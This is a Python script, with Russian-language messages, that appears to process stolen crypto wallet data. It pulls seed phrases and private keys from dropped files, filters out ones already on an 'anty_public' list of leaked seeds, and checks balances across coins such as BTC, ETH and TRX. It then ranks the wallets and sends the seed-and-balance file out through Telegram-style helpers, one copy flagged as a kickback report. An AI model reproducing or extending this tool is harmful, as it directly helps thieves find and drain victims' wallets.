from function import *


while True:
    send_tg(f"Начало чека {datetime.datetime.now().strftime('%d.%m %H:%M')} SYSTEM: {CFG['name']}")
    send_tg(f"Начало чека {datetime.datetime.now().strftime('%d.%m %H:%M')} SYSTEM: {CFG['name']}", stuk= True)
    try:
        for root, dirs, files in os.walk("./for_check/"):  
            for filename in files:
                src = f"{root}{filename}"
                send_tg(f"""файл {src} будет проверен по конфигу\nап {CFG['ап']}\nчек адресов {CFG['чек адресов']}\nмонеты {[x for x in CFG['адреса'].keys()]}\nлимиты для расчёта сумарного отстука: {[' ' + x[0] + ' : ' + str(x[1]) for x in CFG['min_lim'].items()]}""")
                if CFG['ап']:
                    send_tg(f'чек на ап и дубли сидок {filename}')
                    with open(src, 'r+') as f:
                        all_seeds = f.read()
                    lines = all_seeds.split('\n')
                    res = {'path' : src, 'all' : len(lines), 'seed' : 0, 'private' : 0, 'trash': 0, 'duble' : 0, 'ap' : 0}
                    duble = []
                    right_lines = []
                    range_, n = tg_tqdm(len(lines), src, delta_sec = 60), 0
                    t_s = time.time()
                    for line in lines:
                        #print(n)
                        line_res = find_data(line)
                        if line_res == None:
                            res['trash'] += 1

                        elif line_res in ANTY:
                            res['ap'] += 1

                        elif line_res in right_lines:
                            res['duble'] += 1

                        elif any(f'{x}' in line_res for x in range(0, 10)):
                            res['private'] += 1
                            right_lines.append(line_res)

                        elif any(word in line_res.split(' ') for word in BEP39):
                            res['seed'] += 1
                            right_lines.append(line_res)

                        n += 1
                        lstI = (time.time() - t_s) / n
                        lstI = round(lstI, 3)
                        threading.Thread(target = range_.check, args = (n, lstI)).start()
                        

                    with open(src, 'w') as f:
                        all_lines = ''
                        for n, line in enumerate(right_lines, 1):
                            all_lines += f'{line}\n' 
                        f.write(all_lines)

                    with open('anty_public.txt', 'r+') as e:
                        e.seek(0, 2)
                        e.write('\n' + all_lines)

                    range_.check(n, anyth = True)
                    send_tg(f'результат чекa на валидность сидок {res} \n')
                    send_file_tg(src)

                if CFG['чек адресов']:
                    send_tg(f'получение адресов сидок и баланса {filename}')
                    with open(src, 'r+', encoding='utf-8') as f:
                        all_str = f.read()
                    all_str1 = all_str.split('\n')
                    
                    range_ = tg_tqdm(ms = len(all_str1), name = filename, delta_sec = 10)

                    lstI_pre1 = []
                    t_s = time.time()
                    for n, pre_str_ in enumerate(all_str1, 1):
                        str_ = find_data(pre_str_)
                        if str_ != None:
                            th = threading.Thread(target = check_process, args = ((n-1)%K_MAX, str_))
                            th.start()

                            with open(src, 'w', encoding = 'utf-8') as f:
                                all_str = all_str.replace(pre_str_+'\n', '') if pre_str_ != all_str1[-1] else all_str.replace(pre_str_, '')
                                f.write(all_str)

                            try:
                                lstI = (time.time()-t_s) / (n - (threading.active_count() - 1))
                                lstI = round(lstI, 3)
                            except:
                                lstI = None
                            
                            range_.check(n - (threading.active_count() - 1), lstI )
                            while threading.active_count() - 1 >= K_MAX:
                                time.sleep(0.1)

                        all_str1.remove(pre_str_)
                          
                    while threading.active_count() > 1:
                        time.sleep(0.1)
                        range_.check(n - (threading.active_count() - 1), lstI )
                        lstI = (time.time()-t_s) / (n - (threading.active_count() - 1))
                        lstI = round(lstI, 3)
                        time.sleep(0.1)
                            
                    lstI = (time.time()-t_s) / n
                    lstI = round(lstI, 3)
                    lstI = f"\nВремя чека {round((time.time() - t_s)/60)} Мин {round((time.time() - t_s)%60)} Сек | Среднее время чека 1 строки : {lstI}"
                    range_.check(n, lstI, anyth = True)


                    send_tg(f'получил адреса сидок и балансы {filename}')
                    for k in range(1000):
                        s_res_path  = f'./temp/super_res_{k}.txt'
                        res_path  = f'./temp/res_{k}.txt'
                        paths = s_res_path, res_path
                        if file_exist(res_path):
                            for path in paths:
                                with open(path, 'r') as f:
                                    st = f.read()
                                    if path.startswith('./temp/super'):
                                        with open('super_res.txt', 'a') as f1:
                                            f1.write(st)
                                    else:
                                        with open('res.txt', 'a') as f1:
                                            f1.write(st)
                                os.remove(path)
                            
                    #send_file_tg('res.txt')
                    if not CFG['сорт по колву монет']: 
                        send_file_tg('super_res.txt')

                if CFG['сорт по колву монет']:
                    with open('super_res.txt', 'r+') as file:
                        all_res = file.read().split('\n')

                    
                    ress = []
                    processed_seeds = set()

                    for res in all_res:
                        if res != '':
                            seed, balance = res.split(' | ')
                            balance = json.loads(balance)
                            ress.append([seed, balance])

                            #ress.append([seed, {'trx' : balance['trx']}])
                            #print(seed, balance)

                    sorted_ress = sorted(ress, key=lambda x: sum(x[1].values()), reverse=True)

                    oress = {}
                    
                    for data in sorted_ress:
                        for name in data[1].keys():
                            try:
                                if data[1][name] >= CFG['min_lim'][name]:
                                    oress[name] += data[1][name]
                            except:
                                try:
                                    oress[name] += data[1][name]
                                except:
                                    oress[name] = data[1][name]
                    send_tg(json.dumps(oress, indent=4))
                    rr = ''        
                    for r in sorted_ress:
                        rr += f'{r[0]} | {json.dumps(r[1])}\n'

                    with open('super_res.txt', 'w') as file:
                        file.write(rr)
                        
                    send_file_tg('super_res.txt')
                    send_file_tg('super_res.txt', stuk = True)
                send_tg(f"""файл {src} проверен по конфигу\nап {CFG['ап']}\nчек адресов {CFG['чек адресов']}\nмонеты {[x for x in CFG['адреса'].keys()]}\nлимиты для расчёта сумарного отстука: {[' ' + x[0] + ' : ' + str(x[1]) for x in CFG['min_lim'].items()]}""")
                time.sleep(1)
                os.remove(src)
                # BTC ETH TRX ZEC DASH DOGE LTC QTUM
        send_tg(f"Чек закончен")
        break

    except Exception as e:
        send_tg(f"Произошло исключение : {e}")
